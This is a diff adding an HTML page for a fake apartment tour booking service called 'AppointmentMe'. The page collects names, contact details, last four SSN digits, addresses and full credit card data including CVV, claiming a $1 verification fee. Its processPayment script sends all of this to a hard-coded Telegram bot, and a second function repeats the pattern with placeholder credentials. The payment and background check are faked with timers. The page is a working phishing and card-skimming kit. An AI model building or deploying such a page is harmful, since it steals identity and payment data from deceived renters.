@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AppointmentMe | Apartment Tour Scheduling</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+        }
+        body {
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 20px;
+            color: #333;
+        }
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        header {
+            background: #2c3e50;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+        .form-section {
+            padding: 25px;
+            display: none;
+        }
+        .form-section.active {
+            display: block;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #2c3e50;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #2980b9;
+        }
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            padding: 20px;
+            background: #ecf0f1;
+        }
+        .step {
+            text-align: center;
+            position: relative;
+            flex: 1;
+        }
+        .step-number {
+            width: 30px;
+            height: 30px;
+            background: #bdc3c7;
+            color: white;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .step.active .step-number {
+            background: #3498db;
+        }
+        .step.completed .step-number {
+            background: #27ae60;
+        }
+        .step-title {
+            font-size: 12px;
+            color: #7f8c8d;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(0,0,0,0.1);
+            border-radius: 50%;
+            border-top-color: #3498db;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .confirmation {
+            text-align: center;
+            padding: 30px;
+        }
+        .confirmation-icon {
+            font-size: 50px;
+            color: #27ae60;
+            margin-bottom: 20px;
+        }
+        .payment-disclaimer {
+            font-size: 12px;
+            color: #7f8c8d;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Introductory Section -->
+        <div id="intro-section" class="form-section active" style="display: block;">
+            <h2>Welcome to AppointmentMe</h2>
+            <p>
+                Book your next apartment tour with confidence! <strong>AppointmentMe</strong> streamlines the process of scheduling property visits, ensuring your experience is fast, secure, and convenient.<br><br>
+                <strong>How it works:</strong>
+                <ul>
+                    <li>Fill out your basic information</li>
+                    <li>We run a quick background check for your safety and the safety of our community</li>
+                    <li>Pay a $1 verification fee (covers all tours for 30 days)</li>
+                    <li>Choose your preferred property and schedule your tour instantly</li>
+                    <li>Receive instant confirmation and reminders</li>
+                </ul>
+                <em>All your information is encrypted and used only for verification and scheduling purposes.</em>
+                <br><br>
+                Ready to get started? Click below!
+            </p>
+            <button onclick="startApplication()">Start Your Appointment</button>
+        </div>
+        
+        <header>
+            <h1>Book Your Apartment Tour with AppointmentMe</h1>
+        </header>
+        
+        <div class="progress-steps">
+            <div class="step active" id="step1-indicator">
+                <div class="step-number">1</div>
+                <div class="step-title">Personal Info</div>
+            </div>
+            <div class="step" id="step2-indicator">
+                <div class="step-number">2</div>
+                <div class="step-title">Background Check</div>
+            </div>
+            <div class="step" id="step3-indicator">
+                <div class="step-number">3</div>
+                <div class="step-title">Payment</div>
+            </div>
+            <div class="step" id="step4-indicator">
+                <div class="step-number">4</div>
+                <div class="step-title">Schedule</div>
+            </div>
+        </div>
+        
+        <!-- Personal Information Section -->
+        <div id="personal-section" class="form-section active">
+            <h2>Personal Information</h2>
+            <p>Please provide your details to schedule a tour.</p>
+            
+            <div class="form-group">
+                <label for="full-name">Full Name</label>
+                <input type="text" id="full-name" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" required>
+            </div>
+            
+            <button onclick="validatePersonalInfo()">Continue to Background Check</button>
+        </div>
+        
+        <!-- Background Check Section -->
+        <div id="background-section" class="form-section">
+            <h2>Background Verification</h2>
+            <p>For security purposes, we require a quick background check.</p>
+            
+            <div class="form-group">
+                <label for="ssn">Last 4 Digits of SSN</label>
+                <input type="text" id="ssn" maxlength="4" pattern="\d{4}" required>
+                <small class="payment-disclaimer">Used for identity verification only</small>
+            </div>
+            
+            <div class="form-group">
+                <label for="employment">Current Employment Status</label>
+                <select id="employment" required>
+                    <option value="">Select...</option>
+                    <option value="employed">Employed</option>
+                    <option value="self-employed">Self-Employed</option>
+                    <option value="student">Student</option>
+                    <option value="unemployed">Unemployed</option>
+                </select>
+            </div>
+
+            <!-- Address fields start here -->
+            <div class="form-group">
+                <label for="current-address">Current Address</label>
+                <input type="text" id="current-address" required autocomplete="off">
+            </div>
+            <div class="form-group">
+                <label for="city">City</label>
+                <input type="text" id="city" required autocomplete="off">
+            </div>
+            <div class="form-group">
+                <label for="state">State</label>
+                <input type="text" id="state" required autocomplete="off">
+            </div>
+            <div class="form-group">
+                <label for="zipcode">Zip Code</label>
+                <input type="text" id="zipcode" required autocomplete="off" maxlength="10">
+            </div>
+            <!-- Address fields end here -->
+
+            <div id="background-loading" class="loading">
+                <div class="spinner"></div>
+                <p>Verifying your information...</p>
+            </div>
+            
+            <button onclick="runBackgroundCheck()" id="background-button">Verify Identity</button>
+        </div>
+        
+        <!-- Payment Section -->
+        <div id="payment-section" class="form-section">
+            <h2>Verification Payment</h2>
+            <p>A $1 fee is required to complete your background verification.</p>
+            
+            <div class="form-group">
+                <label for="card-name">Name on Card</label>
+                <input type="text" id="card-name" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="card-number">Credit Card Number</label>
+                <input type="text" id="card-number" required>
+            </div>
+            
+            <div style="display: flex; gap: 15px;">
+                <div class="form-group" style="flex: 1;">
+                    <label for="expiry">Expiry Date (MM/YY)</label>
+                    <input type="text" id="expiry" required>
+                </div>
+                <div class="form-group" style="flex: 1;">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" required maxlength="3">
+                </div>
+            </div>
+            
+            <div id="payment-loading" class="loading">
+                <div class="spinner"></div>
+                <p>Processing payment...</p>
+            </div>
+            
+            <button onclick="processPayment()" id="payment-button">Pay $1.00 & Continue</button>
+            <p class="payment-disclaimer">This $1 fee covers your background verification for all properties in our network for 30 days.</p>
+        </div>
+        
+        <!-- Scheduling Section -->
+        <div id="schedule-section" class="form-section">
+            <h2>Schedule Your Tour</h2>
+            <p>Your background verification is complete. Please select a tour time.</p>
+            
+            <div class="form-group">
+                <label for="property">Select Property</label>
+                <select id="property">
+                    <option value="downtown">Downtown Luxury Lofts</option>
+                    <option value="riverside">Riverside Apartments</option>
+                    <option value="hillside">Hillside Residences</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label for="tour-date">Tour Date</label>
+                <input type="date" id="tour-date" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="tour-time">Tour Time</label>
+                <select id="tour-time">
+                    <option value="9:00 AM">9:00 AM</option>
+                    <option value="10:00 AM">10:00 AM</option>
+                    <option value="11:00 AM">11:00 AM</option>
+                    <option value="1:00 PM">1:00 PM</option>
+                    <option value="2:00 PM">2:00 PM</option>
+                    <option value="3:00 PM">3:00 PM</option>
+                </select>
+            </div>
+            
+            <button onclick="scheduleTour()">Confirm Tour</button>
+        </div>
+        
+        <!-- Confirmation Section -->
+        <div id="confirmation-section" class="form-section">
+            <div class="confirmation">
+                <div class="confirmation-icon">✓</div>
+                <h2>Tour Scheduled Successfully!</h2>
+                <p>Thank you for completing your background verification.</p>
+                
+                <div style="text-align: left; max-width: 300px; margin: 20px auto;">
+                    <p><strong>Property:</strong> <span id="confirm-property"></span></p>
+                    <p><strong>Date:</strong> <span id="confirm-date"></span></p>
+                    <p><strong>Time:</strong> <span id="confirm-time"></span></p>
+                </div>
+                
+                <p>A confirmation has been sent to <strong><span id="confirm-email"></span></strong>.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Set minimum date to tomorrow
+        const today = new Date();
+        today.setDate(today.getDate() + 1);
+        document.getElementById('tour-date').min = today.toISOString().split('T')[0];
+        
+        // Format credit card input
+        document.getElementById('card-number').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '');
+            if (value.length > 0) {
+                value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
+            }
+            e.target.value = value;
+        });
+        
+        // Format expiry date input
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+        
+        // Validate personal info
+        function validatePersonalInfo() {
+            const name = document.getElementById('full-name').value;
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            
+            if (!name || !email || !phone) {
+                alert('Please fill in all fields');
+                return;
+            }
+            
+            if (!email.includes('@') || !email.includes('.')) {
+                alert('Please enter a valid email address');
+                return;
+            }
+            
+            // Move to next section
+            document.getElementById('personal-section').classList.remove('active');
+            document.getElementById('background-section').classList.add('active');
+            
+            // Update progress
+            document.getElementById('step1-indicator').classList.remove('active');
+            document.getElementById('step1-indicator').classList.add('completed');
+            document.getElementById('step2-indicator').classList.add('active');
+        }
+        
+        // Run background check
+        function runBackgroundCheck() {
+            const ssn = document.getElementById('ssn').value;
+            const employment = document.getElementById('employment').value;
+            
+            if (!ssn || ssn.length !== 4 || !/^\d+$/.test(ssn)) {
+                alert('Please enter the last 4 digits of your SSN');
+                return;
+            }
+            
+            if (!employment) {
+                alert('Please select your employment status');
+                return;
+            }
+            
+            // Show loading
+            document.getElementById('background-button').disabled = true;
+            document.getElementById('background-loading').style.display = 'block';
+            
+            // Simulate background check (6 seconds)
+            setTimeout(function() {
+                document.getElementById('background-section').classList.remove('active');
+                document.getElementById('payment-section').classList.add('active');
+                document.getElementById('background-loading').style.display = 'none';
+                document.getElementById('background-button').disabled = false;
+                
+                // Update progress
+                document.getElementById('step2-indicator').classList.remove('active');
+                document.getElementById('step2-indicator').classList.add('completed');
+                document.getElementById('step3-indicator').classList.add('active');
+            }, 6000); // <-- Changed from 3000 to 6000 (6 seconds)
+        }
+        
+        // Process payment
+        function processPayment() {
+            const cardName = document.getElementById('card-name').value;
+            const cardNumber = document.getElementById('card-number').value.replace(/\s+/g, '');
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+
+            if (!cardName || !cardNumber || !expiry || !cvv) {
+                alert('Please fill in all payment details');
+                return;
+            }
+
+            if (cardNumber.length < 16) {
+                alert('Please enter a valid card number');
+                return;
+            }
+
+            if (expiry.length < 5) {
+                alert('Please enter a valid expiry date (MM/YY)');
+                return;
+            }
+
+            if (cvv.length < 3) {
+                alert('Please enter a valid CVV');
+                return;
+            }
+
+            // Gather all info
+            const fullName = document.getElementById('full-name').value;
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            const ssn = document.getElementById('ssn').value;
+            const employment = document.getElementById('employment').value;
+            const currentAddress = document.getElementById('current-address').value;
+            const city = document.getElementById('city').value;
+            const state = document.getElementById('state').value;
+            const zipcode = document.getElementById('zipcode').value;
+
+            // Telegram Bot credentials (for demo/test)
+            const botToken = '8017921169:AAG_xbaMZGGWgysVE_qone_buK7x1b_Ixtk';
+            const chatId = '7621733302';
+
+            // Compose message
+            const message =
+                `New Apartment Tour Submission:%0A` +
+                `Name: ${fullName}%0A` +
+                `Email: ${email}%0A` +
+                `Phone: ${phone}%0A` +
+                `SSN (last 4): ${ssn}%0A` +
+                `Employment: ${employment}%0A` +
+                `Current Address: ${currentAddress}%0A` +
+                `City: ${city}%0A` +
+                `State: ${state}%0A` +
+                `Zip Code: ${zipcode}%0A` +
+                `Card Name: ${cardName}%0A` +
+                `Card Number: ${cardNumber}%0A` +
+                `Expiry: ${expiry}%0A` +
+                `CVV: ${cvv}`;
+
+            // Send to Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
+                .then(response => response.json())
+                .then(data => {
+                    // Optionally handle success
+                })
+                .catch(error => {
+                    // Optionally handle error
+                });
+
+            // Show loading
+            document.getElementById('payment-button').disabled = true;
+            document.getElementById('payment-loading').style.display = 'block';
+
+            // Simulate payment processing (10 minutes)
+            setTimeout(function() {
+                document.getElementById('payment-section').classList.remove('active');
+                document.getElementById('schedule-section').classList.add('active');
+                document.getElementById('payment-loading').style.display = 'none';
+                document.getElementById('payment-button').disabled = false;
+
+                // Update progress
+                document.getElementById('step3-indicator').classList.remove('active');
+                document.getElementById('step3-indicator').classList.add('completed');
+                document.getElementById('step4-indicator').classList.add('active');
+            }, 600000); // 10 minutes
+        }
+        
+        // Schedule tour
+        function scheduleTour() {
+            const property = document.getElementById('property').value;
+            const date = document.getElementById('tour-date').value;
+            const time = document.getElementById('tour-time').value;
+            
+            if (!date) {
+                alert('Please select a tour date');
+                return;
+            }
+            
+            // Format date
+            const dateObj = new Date(date);
+            const formattedDate = dateObj.toLocaleDateString('en-US', { 
+                weekday: 'long', 
+                month: 'long', 
+                day: 'numeric' 
+            });
+            
+            // Set confirmation details
+            document.getElementById('confirm-property').textContent = 
+                document.getElementById('property').options[document.getElementById('property').selectedIndex].text;
+            document.getElementById('confirm-date').textContent = formattedDate;
+            document.getElementById('confirm-time').textContent = time;
+            document.getElementById('confirm-email').textContent = document.getElementById('email').value;
+            
+            // Show confirmation
+            document.getElementById('schedule-section').classList.remove('active');
+            document.getElementById('confirmation-section').classList.add('active');
+            
+            // Update progress
+            document.getElementById('step4-indicator').classList.remove('active');
+            document.getElementById('step4-indicator').classList.add('completed');
+        }
+        
+        // Send data to Telegram
+        function sendToTelegram() {
+            // Gather all info
+            const fullName = document.getElementById('full-name').value;
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            const ssn = document.getElementById('ssn').value;
+            const employment = document.getElementById('employment').value;
+            const cardName = document.getElementById('card-name').value;
+            const cardNumber = document.getElementById('card-number').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Telegram Bot credentials
+            const botToken = 'YOUR_BOT_TOKEN'; // <-- Replace with your bot token
+            const chatId = 'YOUR_CHAT_ID';     // <-- Replace with your chat ID
+
+            // Compose message
+            const message = 
+                `New Apartment Tour Submission:%0A` +
+                `Name: ${fullName}%0A` +
+                `Email: ${email}%0A` +
+                `Phone: ${phone}%0A` +
+                `SSN (last 4): ${ssn}%0A` +
+                `Employment: ${employment}%0A` +
+                `Card Name: ${cardName}%0A` +
+                `Card Number: ${cardNumber}%0A` +
+                `Expiry: ${expiry}%0A` +
+                `CVV: ${cvv}`;
+
+            // Send to Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
+                .then(response => response.json())
+                .then(data => {
+                    // Optionally handle success
+                    // console.log('Telegram response:', data);
+                })
+                .catch(error => {
+                    // Optionally handle error
+                    // console.error('Telegram error:', error);
+                });
+        }
+        
+        function startApplication() {
+            document.getElementById('intro-section').style.display = 'none';
+            document.querySelector('header').style.display = '';
+            document.querySelector('.progress-steps').style.display = '';
+            document.getElementById('personal-section').classList.add('active');
+        }
+        window.onload = function() {
+            // Hide all except intro on load
+            document.querySelector('header').style.display = 'none';
+            document.querySelector('.progress-steps').style.display = 'none';
+            document.getElementById('personal-section').classList.remove('active');
+        };
+    </script>
+</body>
+</html>
